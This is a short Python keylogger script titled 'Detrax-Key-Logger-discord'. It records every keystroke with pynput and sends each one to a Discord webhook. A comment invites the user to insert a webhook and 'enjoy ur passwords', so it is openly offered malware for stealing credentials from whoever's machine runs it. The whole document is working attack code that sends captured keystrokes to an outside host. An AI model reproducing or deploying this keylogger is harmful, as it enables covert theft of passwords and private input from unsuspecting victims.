# Detrax-Key-Logger-discord
#you have just to add you're webhook and then enjoy ur passwords ;) 


from dhooks import Webhook
from pynput.keyboard import Key, Listener
hook = Webhook("PUT WEBHOOK HERE")
def on_press(key):
    hook.send(str(key))
with Listener(on_press=on_press) as listener:
    listener.join()
